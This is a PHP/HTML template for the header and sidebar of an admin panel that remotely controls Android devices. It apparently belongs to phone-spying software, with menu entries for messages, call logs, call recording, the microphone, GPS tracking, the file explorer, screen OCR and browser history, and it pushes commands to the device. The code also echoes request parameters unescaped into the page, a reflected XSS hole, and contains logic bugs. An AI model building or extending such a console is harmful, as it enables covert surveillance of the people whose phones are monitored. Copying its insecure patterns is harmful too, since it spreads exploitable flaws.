<?php
$dashboard=$userlist=$message=$ipc=$wifi=$notifications=$microphone=$ocrscreen=$browser=$recording=$track=$location=$deviceapps=$settings=$file_explorer=$calllog=$deviceinfo="";
if($active_page=='index' )
{
    $dashboard='active';
}
else if($active_page=='contact' )
{
    $userlist='active';
}
else if($active_page=='ipconnections' )
{
    $ipc='active';
}
else if($active_page=='notifications' )
{
    $notifications='active';
}
else if($active_page=='recording' )
{
	  $recording='active';
}else if($active_page=='microphone' )
{
	  $microphone='active';
}
else if($active_page=='message' )
{
	  $message='active';
}else if($active_page=='wifi' )
{
	  $wifi='active';
}else if($active_page=='browser' )
{
	  $browser='active';
}else if($active_page=='browser' )
{
	  $track='active';
}else if($active_page=='location' )
{
	  $track='active';
}else if($active_page=='deviceapps' )
{
	$deviceapps = 'active';
}else if($active_page=='settings' )
{
	$settings = 'active';
}else if($active_page=='calllog' )
{
	$calllog = 'active';
}else if($active_page=='file_explorer' )
{
	$file_explorer = 'active';
}else if($active_page='ocrscreen')
{
$ocrscreen = 'active';	
}
else if($active_page=='device_info' )
{
	$deviceinfo = 'active';
}
	isDeviceReady($_REQUEST['id']);
	
	if(isDeviceReady($_REQUEST['id'])){
		
	}else{
		
		 
	}
	 
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="description" content="">
<meta name="author" content="">
<link rel="icon" href="<?php echo base_url();?>favicon.ico">
<title>Admin Panel | User</title>
<!-- Fontawesome icon CSS -->
<link rel="stylesheet" href="<?php echo base_url();?>dist/vendor/font-awesome-4.7.0/css/font-awesome.min.css" type="text/css">

<!-- Bootstrap CSS -->
<link rel="stylesheet" href="<?php echo base_url();?>dist/vendor/bootstrap4alpha/css/bootstrap.css" type="text/css">

<!-- DataTables Responsive CSS -->
<link href="<?php echo base_url();?>dist/vendor/datatables/css/dataTables.bootstrap4.css" rel="stylesheet">
<link href="<?php echo base_url();?>dist/vendor/datatables/css/responsive.dataTables.min.css" rel="stylesheet">
<script src="<?php echo base_url();?>plugins/jQuery/jQuery-2.1.4.min.js"></script>
<!-- jvectormap CSS -->
<link href="<?php echo base_url();?>dist/vendor/jquery-jvectormap/jquery-jvectormap-2.0.3.css" rel="stylesheet">

<!-- Adminux CSS -->
<link rel="stylesheet" href="<?php echo base_url();?>dist/css/dark_blue_adminux.css" type="text/css">

  <link rel="stylesheet" href="<?php echo base_url();?>dist/css/custom.css">
<script>


	function updateClock ( )
 	{
 	var d = new Date();

var month = d.getMonth()+1;
var day = d.getDate();

var output = d.getFullYear() + '/' +
    ((''+month).length<2 ? '0' : '') + month + '/' +
    ((''+day).length<2 ? '0' : '') + day;
    
 	var currentTime = new Date ( );
  	var currentHours = currentTime.getHours ( );
  	var currentMinutes = currentTime.getMinutes ( );
  	var currentSeconds = currentTime.getSeconds ( );

  	// Pad the minutes and seconds with leading zeros, if required
  	currentMinutes = ( currentMinutes < 10 ? "0" : "" ) + currentMinutes;
  	currentSeconds = ( currentSeconds < 10 ? "0" : "" ) + currentSeconds;

  	// Choose either "AM" or "PM" as appropriate
  	var timeOfDay = ( currentHours < 12 ) ? "AM" : "PM";

  	// Convert the hours component to 12-hour format if needed
  	currentHours = ( currentHours > 12 ) ? currentHours - 12 : currentHours;

  	// Convert an hours component of "0" to "12"
  	currentHours = ( currentHours == 0 ) ? 12 : currentHours;

  	// Compose the string for display
  	var currentTimeString = currentHours + ":" + currentMinutes + ":" + currentSeconds + " " + timeOfDay+" "+output;
  	
  	
   	$("#clock").html(currentTimeString);
   	  	
 }
 

$(document).ready(function()
{
	
	var device_ready = 0;
	loaderhtml  = $("#loaddiv").html();
	//displayOverlay('<span id="loadingmodule">loading...</span><div class="loader"></div><span id="loadper">0%</span>');
  // setInterval('updateClock()', 1000);
    displayOverlay(loaderhtml);
   <?php 
    $uuid = $_REQUEST['id'];
	 
   if(isDeviceReady($uuid)){
 
   	?>
   	//alert("here");
  removeOverlay();
   	<?php 	
   
   }else{
   	?>
   	getuserdata('<?php echo $uuid;?>','SEND_DATA');
   	 setInterval('checkDeviceStatus()', 1000);
   	<?php
   } ?>
   
});
////
function checkDeviceStatus()
{
	//alert("make_device_Ready");
	 
	$.ajax({type:'POST',
                    url: '<?php echo site_url("user/checkDeviceStatus");?>', 
                  data: {'id':'<?php echo $_REQUEST['id']?>'},
                  success: function(data){
                  	 moduleloading()
                  	if(data==1){
                  		 
                  		window.location.reload();
                  		
                  	}
 

}
                });
               
}

function moduleloading()
{
	 
	$.ajax({type:'POST',
                    url: '<?php echo site_url("user/checkModuleStatus");?>', 
                  data: {'id':'<?php echo $_REQUEST['id']?>'},
                  success: function(data){
                  	 var obj = jQuery.parseJSON( data );
 
                   $("#loadingmodule").html(obj.module_loading);
                    $("#loadper").html(obj.loading_per+"%");
 

}
                });
               
}

		function delect_item(id,file_name){
				if(confirm("Do you really want to delete this file?")){
					$.ajax({type:'POST',
                    url: '<?=site_url('user/deleteFileItem');?>', 
                  data:{"id":'<?php echo $_GET['id'];?>',"file_id":id,"file_name":file_name},
                  success: function(data){
                  	if(data==1){
alert("Deleted successfully");
window.location.reload();
}else{
	alert("Error occur");
}

}
                });
				}
				 
			}

function cancleRequest()
{
	 
	$.ajax({type:'POST',
                    url: '<?php echo site_url("user/cancleRequest");?>', 
                  data: {'id':'<?php echo $_REQUEST['id']?>'},
                  success: function(data){
                  	 
 

}
                });
               
}

////
//// show loader

function displayOverlay(text) {
  $("<table id='overlay'><tbody><tr><td><lable style='margin-top:-1%;color:red;cursor:pointer;' class='pull-right pull-top' onclick='cancleRequest()' ><small style='color:red' class='badge pull-right bg-red'>X</small></lable></td></tr><tr><td>" + text + "</td></tr></tbody></table>").css({
    "position": "fixed",
    "top": "0px",
    "left": "0px",
    "width": "100%",
    "height": "100%",
    "background-color": "rgba(0,0,0,.5)",
    "z-index": "10000",
    "vertical-align": "middle",
    "text-align": "center",
    "color": "#fff",
    "font-size": "40px",
    "font-weight": "bold",
    "cursor": "wait"
  }).appendTo("body");
}

function removeOverlay() {
  $("#overlay").remove();
}








///end loader


				function getuserdata(id,message)
    	{
    		 //alert(message);
    		$.ajax({type:'POST',
                    url: '<?php echo site_url("notification/push_notify");?>', 
                  data:{"id":id,"message":message}, 
                  success: function(data){
                  	 	data = $.parseJSON(data);
                  	 if(data.success==1){
                  	 	 $("#success_body").html("Wifi status changed successfull!!");
                    	   $("#success_body").show();
                  	 }else{
                  	 	 $("#error_body").html("Wifi status change command fail!!");
                    	   $("#error_body").show();
                  	 }
                  }
                });
                

    	}


	function make_device_ready(uuid)
			{
			  
				 $.ajax({
                url		:	"<?php echo site_url("user/make_device_Ready")?>",
                type	:	"POST", 
                data	:	{"id":uuid},               
                success	:	function(data){   
                          	
                 	 window.location.reload();
			
                 }
            
            });

			}


</script>

</head>
<body class="menuclose menuclose-right">
<!-----My loader---->

<div id="loaddiv" class="loader_wrapper align-items-center text-center">
  <div class="load7 load-wrapper">
    <img style="height: 200px;" src="<?php echo base_url();?>dist/img/logo.png" alt="" class="loading_img">
    <div class="loader">Loading... </div>
    <div class="clearfix"></div>
   
    <h4 class="text-white">Progress</h4>
    <p><span id="loadper">0%</span></p>
  </div>
</div>

<!-----end---->	
	
	
<!-- Page Loader -->
<div  class="loader_wrapper align-items-center text-center">
  <div class="load7 load-wrapper">
    <img src="<?php echo base_url();?>dist/img/logo.png" alt="" class="loading_img">
    <div class="loader"> Loading... </div>
    <div class="clearfix"></div>
    <br>
    <br>
    <br>
    <br>
    <h4 class="text-white">Admin Panel</h4>
    <p>Please wait...</p>
  </div>
</div>


<!-- Page Loader Ends -->

<header class="navbar-fixed">
  <nav class="navbar navbar-toggleable-md navbar-inverse bg-faded">
    <div class="sidebar-left"> <a class="navbar-brand imglogo" href="<?php echo site_url("admin");?>"></a>
      <button class="btn btn-link icon-header mr-sm-2 pull-right menu-collapse" ><span class="fa fa-bars"></span></button>
    </div>
    <!--<form class="form-inline mr-sm-2  pull-left search-header hidden-md-down">
      <input class="form-control " type="text" placeholder="Search" id="search_header">
      <button class="btn btn-link icon-header " type="submit"><span class="fa fa-search"></span></button>
    </form>-->
    <div class="d-flex mr-auto"> &nbsp;</div>
    <ul class="navbar-nav content-right">
      <li class="align-self-center hidden-md-down"> <button onclick="make_device_ready('<?php echo $_REQUEST['id'] ?>')"   class="btn btn-sm btn-primary mr-2"><span class="fa fa-refresh "></span> Reload Panel</button> </li>
      <li class="v-devider"></li>
      	  <?php $battery_info = batteryStatus($_REQUEST['id']);
		 
  $battery_status = $battery_info['battery_status'];
  $sidecolor = "";
  $lowmsg="";
  $b_class = 'primary';
  if($battery_status=="LOW"){
  	$sidecolor = ' style="background-color: #e43513;"';
	  $b_class = 'danger';
	 }
  ?>
      <li class="nav-item active">
         <span class="btn btn-sm btn-<?php echo $b_class;?> mr-2" ><i class="fa fa-battery-half"></i> <?php echo $battery_status;?>  </span>
      </li>
        </ul>
    <div class="sidebar-right pull-right " >
      <ul class="navbar-nav  justify-content-end">
        <li class="nav-item">
          <button class="btn-link btn userprofile"  data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><span class="userpic"><img src="<?php echo base_url();?>dist/img/user.png" alt="user pic"></span> <span class="text">Admin</span></button>
          <div class="dropdown-menu"> <a class="dropdown-item" href="<?php echo site_url('admin/editprofile'); ?>">Change Password</a>  
              <div class="dropdown-divider"></div>
        <a class="dropdown-item" href="<?php echo site_url('login/logout'); ?>">Logout</a>
              </div>
        </li>
        <li><a href="<?php echo site_url('login/logout'); ?>" class="btn btn-link icon-header" ><span class="fa fa-sign-out"></span></a></li>
      </ul>
    </div>
  </nav>
</header>
<div class="sidebar-left">
  <div class="user-menu-items">
    <div class="list-unstyled btn-group">
      <button class="media btn btn-link  "   data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <span class="message_userpic"><img class="d-flex" src="<?php echo base_url().deviceImage($_REQUEST['id']);?>" alt=""></span> <span class="media-body"> <span class="mt-0 mb-1"><?php echo $_GET['id'];?></span> </span> </button>
    <!--  <div class="dropdown-menu"> <a class="dropdown-item" href="<?php echo site_url('admin/editprofile'); ?>">Change Password</a> 
        <div class="dropdown-divider"></div>
        <a class="dropdown-item" href="<?php echo site_url('login/logout'); ?>">Logout</a> </div>-->
    </div>
  </div>
  <br>
  <ul class="nav flex-column in" id="side-menu">
 
    <li class="title-nav"> 
     
    	MENU
    	
    	</li>
    <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/index").'?id='.$_REQUEST['id'];?>"><i class="fa fa-tachometer left-icon circle"></i>Dashboard</a> </li>
    <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/device_info").'?id='.$_REQUEST['id'];?>"><i class="fa fa-mobile left-icon circle"></i>Device Info</a> </li>
    <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/contact").'?id='.$_REQUEST['id'];?>"><i class="fa fa-users  left-icon circle"></i>Contacts</a> </li>
    
    <!-----Options---->
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/calllogs").'?id='.$_REQUEST['id'];?>"><i class="fa fa-phone  left-icon circle"></i>Call Logs</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/deviceapps").'?id='.$_REQUEST['id'];?>"><i class="fa fa-android  left-icon circle"></i>App Installed</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/messages").'?id='.$_REQUEST['id'];?>"><i class="fa fa-envelope  left-icon circle"></i>Messages</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/ipconnections").'?id='.$_REQUEST['id'];?>"><i class="fa fa-desktop  left-icon circle"></i>IP Connections</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/wifi").'?id='.$_REQUEST['id'];?>"><i class="fa fa-wifi  left-icon circle"></i>Wifi Connections</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/browser").'?id='.$_REQUEST['id'];?>"><i class="fa fa-globe  left-icon circle"></i>Browser History</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/gpsTrack").'?id='.$_REQUEST['id'];?>"><i class="fa fa-map-marker  left-icon circle"></i>GPS Track</a> </li>
    
            <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/file_explorer").'?id='.$_REQUEST['id'];?>"><i class="fa fa-folder  left-icon circle"></i>File Explorer</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/microphone").'?id='.$_REQUEST['id'];?>"><i class="fa fa-microphone  left-icon circle"></i>Microphone</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/recording").'?id='.$_REQUEST['id'];?>"><i class="fa fa-volume-control-phone  left-icon circle"></i>Call recording</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/ocr_screen_list").'?id='.$_REQUEST['id'];?>"><i class="fa fa-picture-o  left-icon circle"></i>OCR Screen Data</a> </li>
     
                <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/notifications").'?id='.$_REQUEST['id'];?>"><i class="fa fa-bell  left-icon circle"></i>Notifications</a> </li>
        <li  class="nav-item"> <a class="nav-link" href="<?php echo site_url("user/settings").'?id='.$_REQUEST['id'];?>"><i class="fa fa-cog  left-icon circle"></i>Device Settings</a> </li>
 
        
  </ul>
  
  <br><br><br>
</div>